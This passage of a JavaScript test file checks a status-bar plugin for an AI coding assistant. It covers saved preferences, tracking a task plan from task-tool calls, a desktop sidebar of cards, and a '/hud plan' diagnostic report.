    await hud.say('suggest off');
    const saved = store.data.get('prefs');
    expect(saved.suggestOn).toBe(false);
    expect(saved.confirmOn).toBe(true);
});

test('and it is still off after a restart', async () => {
    const store = memoryStore({ prefs: { suggestOn: false, headsOn: false, blastOn: true, confirmOn: false } });
    const hud = await hudWith(store);
    await hud.start();
    // The status sentence, not the word "off": every reply ends with a hint
    // that mentions "/hud confirm off", so a bare includes('off') is true
    // whether or not anything was restored.
    expect((await hud.say('confirm')).text.startsWith('Asking near the limit is off')).toBe(true);
    expect((await hud.say('suggest')).text.startsWith('Suggestions are off')).toBe(true);
    expect((await hud.say('know')).text.startsWith('Heads up is off')).toBe(true);
    expect((await hud.say('blast')).text.startsWith('Blast radius is on')).toBe(true);
});

test('a lookup writes nothing', async () => {
    const store = memoryStore({ prefs: { suggestOn: true, headsOn: true, blastOn: true, confirmOn: true } });
    const hud = await hudWith(store);
    await hud.start();
    await hud.say('confirm on');
    await hud.say('suggest on');
    await hud.say('models');
    expect(store.writes.length).toBe(0);
});

test('a value some other version wrote is not believed', async () => {
    // Falsy non-booleans, because the defaults are all on: a value that
    // would be read as true anyway cannot tell "ignored" from "believed".
    const store = memoryStore({ prefs: { suggestOn: 0, headsOn: '', blastOn: null, confirmOn: 'false' } });
    const hud = await hudWith(store);
    await hud.start();
    expect((await hud.say('suggest')).text.includes('are on')).toBe(true);
    expect((await hud.say('know')).text.includes('is on')).toBe(true);
    expect((await hud.say('blast')).text.includes('is on')).toBe(true);
    expect((await hud.say('confirm')).text.includes('on, once per window')).toBe(true);
});

test('a store that throws never breaks a session or a command', async () => {
    const broken = {
        get: async () => { throw new Error('store unavailable'); },
        set: async () => { throw new Error('store unavailable'); },
    };
    const hud = await hudWith(broken);
    await hud.start();
    const reply = await hud.say('suggest off');
    expect(reply.text.includes('off')).toBe(true);
});

test('and no store at all is the same as an empty one', async () => {
    const hud = await hudWith(undefined);
    await hud.start();
    const reply = await hud.say('suggest off');
    expect(reply.text.includes('off')).toBe(true);
});

// ================================== the plan, from the newer task tools
//
// An interactive session does not write one whole list. It adds a task at a
// time with TaskCreate and flips each by id with TaskUpdate, so a bar that
// only listens for TodoWrite never sees a plan in the sessions that most need
// one. These cover keeping the plan from the pieces.

const made = (id, subject) => ({ result: { task: { id, subject } } });

test('TaskCreate adds a pending task, named by the id the tool answered with', async () => {
    const after = applyTaskTool([], 'TaskCreate', { subject: 'Wire the panel', activeForm: 'Wiring the panel' }, made('7', 'Wire the panel'));
    expect(after.length).toBe(1);
    expect(after[0].id).toBe('7');
    expect(after[0].status).toBe('pending');
    expect(after[0].activeForm).toBe('Wiring the panel');
});

test('a TaskCreate that answered with no id creates nothing', async () => {
    // Guessing an id would let a later update land on the wrong task.
    expect(applyTaskTool([], 'TaskCreate', { subject: 'x' }, { result: {} }).length).toBe(0);
    expect(applyTaskTool([], 'TaskCreate', { subject: 'x' }, undefined).length).toBe(0);
});

test('TaskUpdate flips the task it names and keeps the status spelled right', async () => {
    const start = [{ id: '1', subject: 'a', activeForm: '', status: 'pending' }];
    const after = applyTaskTool(start, 'TaskUpdate', { taskId: '1', status: 'in_progress' }, { result: { success: true } });
    expect(after[0].status).toBe('in_progress');
});

test('a status with a space or a hyphen is read as the same status', async () => {
    const start = [{ id: '1', subject: 'a', activeForm: '', status: 'pending' }];
    expect(applyTaskTool(start, 'TaskUpdate', { taskId: '1', status: 'in-progress' }, {})[0].status).toBe('in_progress');
    expect(applyTaskTool(start, 'TaskUpdate', { taskId: '1', status: 'In Progress' }, {})[0].status).toBe('in_progress');
});

test('a refused update changes nothing', async () => {
    const start = [{ id: '1', subject: 'a', activeForm: '', status: 'pending' }];
    const after = applyTaskTool(start, 'TaskUpdate', { taskId: '1', status: 'completed' }, { result: { success: false } });
    expect(after[0].status).toBe('pending');
});

test('a deleted task leaves the plan', async () => {
    const start = [
        { id: '1', subject: 'a', activeForm: '', status: 'pending' },
        { id: '2', subject: 'b', activeForm: '', status: 'pending' },
    ];
    const after = applyTaskTool(start, 'TaskUpdate', { taskId: '1', status: 'deleted' }, {});
    expect(after.length).toBe(1);
    expect(after[0].id).toBe('2');
});

test('a task made before the mod was watching still counts', async () => {
    // Its name is unknown, but a plan with a hole in it reports the wrong total.
    const after = applyTaskTool([], 'TaskUpdate', { taskId: '9', status: 'completed' }, {});
    expect(after.length).toBe(1);
    expect(after[0].status).toBe('completed');
});

test('TaskList is the whole truth and replaces what was inferred', async () => {
    const start = [{ id: '1', subject: 'old', activeForm: 'Doing old', status: 'pending' }];
    const after = applyTaskTool(start, 'TaskList', {}, { result: { tasks: [
        { id: '1', subject: 'old', status: 'completed', blockedBy: [] },
        { id: '2', subject: 'new', status: 'in_progress', blockedBy: [] },
    ] } });
    expect(after.length).toBe(2);
    expect(after[0].status).toBe('completed');
    // What the list cannot say is kept from what was already known.
    expect(after[0].activeForm).toBe('Doing old');
});

test('a new job after a finished one starts a fresh plan', async () => {
    // Otherwise last hour's five finished tasks sit in the total and the bar
    // opens at 60% on work that has not begun.
    const finished = [
        { id: '1', subject: 'a', activeForm: '', status: 'completed' },
        { id: '2', subject: 'b', activeForm: '', status: 'completed' },
    ];
    const after = applyTaskTool(finished, 'TaskCreate', { subject: 'next job' }, made('3', 'next job'));
    expect(after.length).toBe(1);
    expect(after[0].id).toBe('3');
});

test('but a task added mid-job joins the plan it belongs to', async () => {
    const running = [
        { id: '1', subject: 'a', activeForm: '', status: 'completed' },
        { id: '2', subject: 'b', activeForm: '', status: 'in_progress' },
    ];
    expect(applyTaskTool(running, 'TaskCreate', { subject: 'c' }, made('3', 'c')).length).toBe(3);
});

test('an unrelated tool leaves the plan alone', async () => {
    const start = [{ id: '1', subject: 'a', activeForm: '', status: 'pending' }];
    expect(applyTaskTool(start, 'Bash', { command: 'ls' }, {})).toBe(start);
});

test('the tracked tasks draw as the same bar TodoWrite does', async () => {
    const tasks = [
        { id: '1', subject: 'one', activeForm: 'Doing one', status: 'completed' },
        { id: '2', subject: 'two', activeForm: 'Doing two', status: 'in_progress' },
        { id: '3', subject: 'three', activeForm: 'Doing three', status: 'pending' },
        { id: '4', subject: 'four', activeForm: 'Doing four', status: 'pending' },
    ];
    const plan = progressOf(todosFromTasks(tasks));
    expect(plan.total).toBe(4);
    expect(plan.done).toBe(1);
    expect(plan.label).toBe('Doing two');
    expect(worthShowing(plan)).toBe(true);
});

// And the part that was actually broken: through the real hooks, in the order
// a session makes the calls, the bar appears.

async function runTaskCalls(calls) {
    const hooks = [];
    const on = (event, a, b) => {
        const matcher = typeof a === 'function' ? null : a;
        hooks.push({ event, matcher, handler: typeof a === 'function' ? a : b });
        return { catch: () => undefined };
    };
    const mod = await import('../hooks/register.js');
    mod.register(on);

    const el = (type) => (props) => ({ type, ...props });
    const ctx = {
        ui: {
            resolve: () => ({ Box: el('Box'), Text: el('Text'), Svg: el('Svg'), Button: el('Button') }),
            invalidate: () => undefined,
        },
        session: { model: async () => 'claude-opus-5-5' },
        clock: { after: () => undefined, every: () => undefined },
    };

    for (const [tool, input, result] of calls) {
        const hook = hooks.find((h) => h.event === 'tool.call' && h.matcher && h.matcher.tool === tool);
        expect(!!hook).toBe(true);
        const answered = await hook.handler(ctx, { tool, ...input }, async () => result);
        // The hook must hand back exactly what the tool answered.
        expect(answered).toBe(result);
    }

    // The band, by name: there is a second ui.render hook now, the sidebar's,
    // and asking for "the" render hook would hand back whichever came first.
    const render = hooks.find((h) => h.event === 'ui.render' && h.matcher && h.matcher.component === 'AbovePrompt');
    return render.handler(ctx, { surface: 'terminal', component: 'AbovePrompt', props: { bodyColumns: 120 } }, async () => null);
}

const hasBar = (tree) => !!(tree && tree.children && tree.children.find((c) => c.key === 'hud-progress'));

test('a plan built with TaskCreate and TaskUpdate shows the bar', async () => {
    const tree = await runTaskCalls([
        ['TaskList', {}, { result: { tasks: [] } }],
        ['TaskCreate', { subject: 'one' }, made('1', 'one')],
        ['TaskCreate', { subject: 'two' }, made('2', 'two')],
        ['TaskCreate', { subject: 'three' }, made('3', 'three')],
        ['TaskUpdate', { taskId: '1', status: 'completed' }, { result: { success: true } }],
        ['TaskUpdate', { taskId: '2', status: 'in_progress' }, { result: { success: true } }],
    ]);
    expect(hasBar(tree)).toBe(true);
});

test('and the bar goes when the last task lands', async () => {
    const tree = await runTaskCalls([
        ['TaskList', {}, { result: { tasks: [] } }],
        ['TaskCreate', { subject: 'one' }, made('1', 'one')],
        ['TaskCreate', { subject: 'two' }, made('2', 'two')],
        ['TaskUpdate', { taskId: '1', status: 'completed' }, { result: { success: true } }],
        ['TaskUpdate', { taskId: '2', status: 'completed' }, { result: { success: true } }],
    ]);
    expect(hasBar(tree)).toBe(false);
});

test('one task alone is not a plan', async () => {
    const tree = await runTaskCalls([
        ['TaskList', {}, { result: { tasks: [] } }],
        ['TaskCreate', { subject: 'only' }, made('1', 'only')],
    ]);
    expect(hasBar(tree)).toBe(false);
});

test('a result the hook does not understand never breaks the call', async () => {
    // Whatever comes back must still reach the model untouched.
    const tree = await runTaskCalls([
        ['TaskList', {}, { result: { tasks: [] } }],
        ['TaskCreate', { subject: 'x' }, 'not even an object'],
        ['TaskUpdate', { taskId: '1' }, null],
    ]);
    expect(hasBar(tree)).toBe(false);
});

// ====================================================== the desktop sidebar
//
// The whole HUD as a stack of cards, for the desktop app. Two promises matter
// more than any detail of how it looks. The terminal must never be touched,
// since panes exist there too and an unconditional open would have changed a
// terminal that was already right. And the information must never be missing
// from both places at once: the strip steps aside only while the sidebar is
// really on screen.

const elOf = (type) => (props) => ({ type, ...props });
const factories = { Box: elOf('Box'), Text: elOf('Text'), Svg: elOf('Svg'), Button: elOf('Button') };

function walk(node, visit) {
    if (!node || typeof node !== 'object') return;
    visit(node);
    for (const child of node.children || []) walk(child, visit);
}

function hasKey(tree, key) {
    let found = false;
    walk(tree, (n) => { if (n.key === key) found = true; });
    return found;
}

function textsOf(tree) {
    const out = [];
    walk(tree, (n) => { if (n.type === 'Text') out.push((n.children || []).join('')); });
    return out.join(' | ');
}

const reading = (key, label, percent, extra) => ({
    key, label, percent, level: percent >= 86 ? 'urgent' : percent >= 56 ? 'watch' : 'calm',
    resetsAt: null, resetForm: 'none', note: '', ...extra,
});

// ---- the pure builder

test('an empty sidebar is just the model card', async () => {
    const tree = buildPanel(factories, { model: 'opus 5.5', worst: 'calm', readings: [], collapsed: {} });
    expect(hasKey(tree, 'card-hud')).toBe(true);
    expect(hasKey(tree, 'card-usage')).toBe(false);
    expect(hasKey(tree, 'card-progress')).toBe(false);
    expect(hasKey(tree, 'card-agents')).toBe(false);
});

test('a card with nothing to say is left out, not drawn empty', async () => {
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'calm', readings: [], plan: null, agents: [], collapsed: {},
    });
    expect(tree.children.length).toBe(1);
});

test('every reading gets a row and a gauge', async () => {
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'watch', collapsed: {},
        readings: [reading('ctx', 'Ctx', 15), reading('session', 'Session', 58), reading('week', 'Week', 71)],
    });
    for (const k of ['ctx', 'session', 'week']) {
        expect(hasKey(tree, 'u-' + k)).toBe(true);
        expect(hasKey(tree, 'u-g-' + k)).toBe(true);
    }
});

test('a window with a reset says when it resets', async () => {
    const far = Math.floor(Date.now() / 1000) + 40 * 3600;
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'calm', collapsed: {},
        readings: [reading('week', 'Week', 40, { resetsAt: far, resetForm: 'clock' })],
    });
    expect(textsOf(tree).includes('resets')).toBe(true);
});

test('context has no reset line, because it does not reset', async () => {
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'calm', collapsed: {}, readings: [reading('ctx', 'Ctx', 15)],
    });
    expect(textsOf(tree).includes('resets')).toBe(false);
});

test('a folded card is only its header', async () => {
    const data = {
        model: 'opus 5.5', worst: 'calm', readings: [reading('ctx', 'Ctx', 15)],
        collapsed: { usage: true },
    };
    const tree = buildPanel(factories, data);
    expect(hasKey(tree, 'card-usage')).toBe(true);
    expect(hasKey(tree, 'u-ctx')).toBe(false);
    // The header still says the one figure worth knowing.
    expect(textsOf(tree).includes('15%')).toBe(true);
});

test('pressing a card header asks to fold it', async () => {
    let asked = null;
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'calm', readings: [reading('ctx', 'Ctx', 15)],
        collapsed: {}, toggle: (key) => { asked = key; },
    });
    let button = null;
    walk(tree, (n) => { if (n.type === 'Button' && n.key === 'b-usage') button = n; });
    expect(!!button).toBe(true);
    button.onPress();
    expect(asked).toBe('usage');
});

test('the plan is listed item by item, the one in hand first', async () => {
    const plan = { total: 4, done: 1, doing: 1, percent: 25, donePercent: 25, reachedPercent: 50, complete: false };
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'calm', readings: [], collapsed: {}, plan,
        planItems: [
            { content: 'alpha-finished', status: 'completed' },
            { content: 'two', activeForm: 'Doing two', status: 'in_progress' },
            { content: 'three', status: 'pending' },
            { content: 'four', status: 'pending' },
        ],
    });
    expect(hasKey(tree, 'card-progress')).toBe(true);
    const text = textsOf(tree);
    expect(text.includes('Doing two')).toBe(true);
    expect(text.indexOf('Doing two') < text.indexOf('three')).toBe(true);
    // A finished task is a count, not a row. A distinctive name, because a
    // short one is found inside "1 done" and proves nothing.
    expect(text.includes('alpha-finished')).toBe(false);
    expect(text.includes('1 done')).toBe(true);
});

test('a long plan says how many more there are', async () => {
    const items = [];
    for (let i = 0; i < 12; i += 1) items.push({ content: 'task ' + i, status: 'pending' });
    const plan = { total: 12, done: 0, doing: 0, percent: 0, donePercent: 0, reachedPercent: 0, complete: false };
    const tree = buildPanel(factories, { model: 'm', worst: 'calm', readings: [], collapsed: {}, plan, planItems: items });
    expect(textsOf(tree).includes('and 5 more')).toBe(true);
});

test('agents are listed by name, with how long they have run', async () => {
    const tree = buildPanel(factories, {
        model: 'm', worst: 'calm', readings: [], collapsed: {},
        agents: [{ name: 'general', status: 'running', startedAt: Date.now() - 200000, tokens: 3100000 }],
        agentShares: [1],
    });
    expect(hasKey(tree, 'card-agents')).toBe(true);
    expect(textsOf(tree).includes('general')).toBe(true);
});

test('one agent is not given a share, since one agent is all of them', async () => {
    const tree = buildPanel(factories, {
        model: 'm', worst: 'calm', readings: [], collapsed: {},
        agents: [{ name: 'general', status: 'running', startedAt: Date.now(), tokens: 10 }],
        agentShares: [1],
    });
    expect(textsOf(tree).includes('of all agent work')).toBe(false);
});

test('two agents are each given their share', async () => {
    const tree = buildPanel(factories, {
        model: 'm', worst: 'calm', readings: [], collapsed: {},
        agents: [
            { name: 'a', status: 'running', startedAt: Date.now(), tokens: 75 },
            { name: 'b', status: 'running', startedAt: Date.now(), tokens: 25 },
        ],
        agentShares: [0.75, 0.25],
    });
    expect(textsOf(tree).includes('75%')).toBe(true);
    expect(textsOf(tree).includes('25%')).toBe(true);
});

test('routing shows each tier and starts folded', async () => {
    expect(DEFAULT_COLLAPSED.routing).toBe(true);
    const tree = buildPanel(factories, {
        model: 'm', worst: 'calm', readings: [], routingOn: true,
        tiers: { fast: 'haiku 5.5', base: 'sonnet 5.5', deep: 'opus 5.5', top: 'fable 5.1' },
        log: [{ tier: 'deep', short: 'opus 5.5' }], collapsed: {},
    });
    const text = textsOf(tree);
    for (const m of ['haiku 5.5', 'sonnet 5.5', 'opus 5.5', 'fable 5.1']) expect(text.includes(m)).toBe(true);
});

test('no text in the sidebar is left free to wrap mid-word', async () => {
    // The rule the strip learned: a label that tears across two lines is worse
    // than one that ends in an ellipsis.
    const plan = { total: 3, done: 1, doing: 1, percent: 33, donePercent: 33, reachedPercent: 66, complete: false };
    const tree = buildPanel(factories, {
        model: 'opus 5.5', worst: 'watch', pinned: false, routingOn: true, reason: 'deep work',
        readings: [reading('ctx', 'Ctx', 15), reading('week', 'Week', 71)],
        plan, planItems: [{ content: 'a', activeForm: 'Doing a', status: 'in_progress' }],
        agents: [{ name: 'g', status: 'running', startedAt: Date.now(), tokens: 5 }], agentShares: [1],
        tiers: { fast: 'a', base: 'b', deep: 'c', top: 'd' }, log: [{ tier: 'deep', short: 'x' }],
        collapsed: {},
    });
    let bare = 0;
    walk(tree, (n) => { if (n.type === 'Text' && !n.wrap) bare += 1; });
    expect(bare).toBe(0);
});

// ---- through the real hooks

async function sidebarSession(opts) {
    const o = Object.assign({ surfaces: ['terminal'], placed: false }, opts || {});
    const hooks = [];
    const on = (event, a, b) => {
        hooks.push({ event, matcher: typeof a === 'function' ? null : a, handler: typeof a === 'function' ? a : b });
        return { catch: () => undefined };
    };
    const mod = await import('../hooks/register.js');
    mod.register(on);

    const calls = { open: [], close: [] };
    const ctx = {
        ui: {
            resolve: () => factories,
            invalidate: () => undefined,
            open: async (args) => { calls.open.push(args); return { isPlaced: o.placed }; },
            close: async (args) => { calls.close.push(args); },
            panes: async () => [{ id: 'hud', title: 'HUD', isShown: o.placed, isFocused: false, isPlaced: o.placed }],
        },
        session: {
            surfaces: async () => o.surfaces,
            model: async () => 'claude-opus-5-5',
            usage: async () => ({ context: { percent: 40 }, rateLimits: [] }),
        },
        command: { register: async () => undefined },
        clock: { after: () => undefined, every: () => undefined },
    };
    const next = async (e) => e;
    const find = (event, component) => hooks.find((h) => h.event === event
        && (!component || (h.matcher && h.matcher.component === component)));

    // Each test begins with the sidebar not dismissed, the way a new session does.
    await find('command.run').handler(ctx, { args: 'panel' });
    calls.open.length = 0;
    calls.close.length = 0;

    return {
        calls, ctx, hooks, next,
        start: () => find('session.start').handler(ctx, {}, next),
        attach: (surface) => find('session.attach').handler(ctx, { surface, clientId: surface + ':default' }, next),
        closed: (origin) => find('ui.close').handler(ctx, { id: 'hud', origin }, next),
        band: (surface) => find('ui.render', 'AbovePrompt').handler(ctx, { surface, component: 'AbovePrompt' }, async () => null),
        pane: (surface) => find('ui.render', 'Pane').handler(ctx, { surface, component: 'Pane', requestId: 'hud' }, async () => 'fell through'),
        say: (args) => find('command.run').handler(ctx, { args }),
    };
}

test('the sidebar is never offered to the terminal', async () => {
    const h = await sidebarSession({ surfaces: ['terminal'] });
    await h.start();
    expect(h.calls.open.length).toBe(0);
});

test('and not on a session with nothing attached at all', async () => {
    const h = await sidebarSession({ surfaces: [] });
    await h.start();
    expect(h.calls.open.length).toBe(0);
});

test('it is opened when the desktop app is there at the start', async () => {
    const h = await sidebarSession({ surfaces: ['terminal', 'desktop'], placed: true });
    await h.start();
    expect(h.calls.open.length).toBe(1);
    expect(h.calls.open[0].id).toBe(PANE_ID);
});

test('it is opened when the desktop app attaches later', async () => {
    const h = await sidebarSession({ placed: true });
    await h.attach('desktop');
    expect(h.calls.open.length).toBe(1);
});

test('and not for a phone or an editor, which are not the desktop', async () => {
    const h = await sidebarSession({ placed: true });
    await h.attach('mobile');
    await h.attach('vscode');
    expect(h.calls.open.length).toBe(0);
});

test('a sidebar the person closed is not reopened behind their back', async () => {
    const h = await sidebarSession({ placed: true });
    await h.closed('person');
    await h.attach('desktop');
    expect(h.calls.open.length).toBe(0);
});

test('but a close that was not theirs does not count as their choice', async () => {
    const h = await sidebarSession({ placed: true });
    await h.closed('plugin');
    await h.attach('desktop');
    expect(h.calls.open.length).toBe(1);
});

test('/hud panel opens it again after it was closed', async () => {
    const h = await sidebarSession({ placed: true });
    await h.closed('person');
    const reply = await h.say('panel');
    expect(h.calls.open.length).toBe(1);
    expect(reply.text.includes('Sidebar open')).toBe(true);
});

test('/hud panel off closes it and says the strip is back', async () => {
    const h = await sidebarSession({ placed: true });
    const reply = await h.say('panel off');
    expect(h.calls.close.length).toBe(1);
    expect(h.calls.close[0].id).toBe(PANE_ID);
    expect(reply.text.includes('strip is back')).toBe(true);
});

test('/hud panel where nothing can draw it says so rather than pretending', async () => {
    const h = await sidebarSession({ placed: false });
    const reply = await h.say('panel');
    expect(reply.text.includes('Nothing here can draw')).toBe(true);
});

test('on the desktop with the sidebar showing, the strip steps aside', async () => {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    const tree = await h.band('desktop');
    // Whatever else the band may carry, the strip itself is not in it.
    expect(hasKey(tree, 'id')).toBe(false);
    expect(hasKey(tree, 'rdctx')).toBe(false);
});

test('but never while the sidebar is not actually on screen', async () => {
    // Opened but waiting undrawn, in a window too narrow for it. The strip
    // must stay, or the numbers are missing from both places at once.
    const h = await sidebarSession({ surfaces: ['desktop'], placed: false });
    const tree = await h.band('desktop');
    expect(!!tree).toBe(true);
    expect(hasKey(tree, 'id')).toBe(true);
});

test('and the terminal always keeps its strip, whatever a pane says', async () => {
    const h = await sidebarSession({ surfaces: ['terminal'], placed: true });
    const tree = await h.band('terminal');
    expect(!!tree).toBe(true);
    expect(tree.type).toBe('Box');
});

test('the sidebar draws for the desktop and for nothing else', async () => {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    expect((await h.pane('desktop')).type).toBe('Box');
    expect(await h.pane('terminal')).toBe('fell through');
    expect(await h.pane('mobile')).toBe('fell through');
});

test('the drawn sidebar carries the model and the usage', async () => {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    const tree = await h.pane('desktop');
    expect(hasKey(tree, 'card-hud')).toBe(true);
    expect(hasKey(tree, 'card-usage')).toBe(true);
});

test('the pane is drawn by the hook that matches the id it is opened under', async () => {
    // The render hook's matcher spells the id out so the validator can read
    // it, and the opener uses the constant. If the two ever drift the pane
    // opens and nothing draws it, which looks exactly like a blank sidebar.
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    const drawer = h.hooks.find((x) => x.event === 'ui.render' && x.matcher && x.matcher.component === 'Pane');
    expect(drawer.matcher.requestId).toBe(PANE_ID);
    await h.attach('desktop');
    expect(h.calls.open[0].id).toBe(drawer.matcher.requestId);
});

// ===================================== why is there no progress bar? /hud plan
//
// The bar is silent when there is no plan, which is also exactly what it does
// when something upstream is wrong. From the outside those are identical, and
// telling them apart used to take a round trip. /hud plan says which, by
// counting what actually arrived.

const none = { TodoWrite: 0, TaskCreate: 0, TaskUpdate: 0, TaskList: 0, last: '' };

test('/hud plan says no plan tool has been called, and what to do about it', async () => {
    const text = planReport({ seen: none, tasks: [], plan: null }).join('\n');
    expect(text.includes('No plan tool has been called')).toBe(true);
    // The two real causes, so the person knows which to chase.
    expect(text.includes('not keeping a task list')).toBe(true);
    expect(text.includes('restarted')).toBe(true);
});

test('it says tasks were seen but there is no bar, and why that is correct', async () => {
    const text = planReport({
        seen: { ...none, TaskCreate: 1, last: 'TaskCreate' },
        tasks: [{ id: '1', subject: 'a', status: 'pending' }],
        plan: null,
    }).join('\n');
    expect(text.includes('Tasks have been seen, but there is no bar')).toBe(true);
    expect(text.includes('two or more')).toBe(true);
});

test('it says the bar should be showing when there is a live plan', async () => {
    const plan = { total: 4, done: 1, doing: 1, percent: 25, complete: false };
    const text = planReport({ seen: { ...none, TaskCreate: 4, TaskUpdate: 2, last: 'TaskUpdate' }, tasks: [{}, {}, {}, {}], plan }).join('\n');
    expect(text.includes('1/4 done (25%)')).toBe(true);
    expect(text.includes('The bar should be showing')).toBe(true);
});

test('it says when the plan is finished and the bar has gone', async () => {
    const plan = { total: 2, done: 2, doing: 0, percent: 100, complete: true };
    const text = planReport({ seen: { ...none, TaskCreate: 2, last: 'TaskUpdate' }, tasks: [{}, {}], plan }).join('\n');
    expect(text.includes('finished')).toBe(true);
    expect(text.includes('has gone')).toBe(true);
});

test('it lists exactly how many of each call went past', async () => {
    const text = planReport({
        seen: { TodoWrite: 3, TaskCreate: 5, TaskUpdate: 7, TaskList: 2, last: 'TaskList' },
        tasks: [], plan: null,
    }).join('\n');
    expect(text.includes('TaskCreate 5, TaskUpdate 7, TaskList 2, TodoWrite 3')).toBe(true);
    expect(text.includes('last was TaskList')).toBe(true);
});

test('a missing record reads as nothing seen rather than crashing', async () => {
    const text = planReport({}).join('\n');
    expect(text.includes('No plan tool has been called')).toBe(true);
});

test('a task call going through the real hook is counted, and /hud plan sees it', async () => {
    const h = await sidebarSession({ surfaces: ['terminal'] });
    const countOf = async () => {
        const text = (await h.say('plan')).text;
        const m = text.match(/TaskCreate (\d+)/);
        return m ? Number(m[1]) : -1;
    };
    const before = await countOf();
    const hook = h.hooks.find((x) => x.event === 'tool.call' && x.matcher && x.matcher.tool === 'TaskCreate');
    await hook.handler(h.ctx, { tool: 'TaskCreate', subject: 'counted' }, async () => ({ result: { task: { id: 'plan-test-1', subject: 'counted' } } }));
    const after = await countOf();
    expect(after).toBe(before + 1);
});

test('and /hud plan is listed in the help', async () => {
    const h = await sidebarSession({ surfaces: ['terminal'] });
    const text = (await h.say('')).text;
    expect(text.includes('/hud plan')).toBe(true);
});
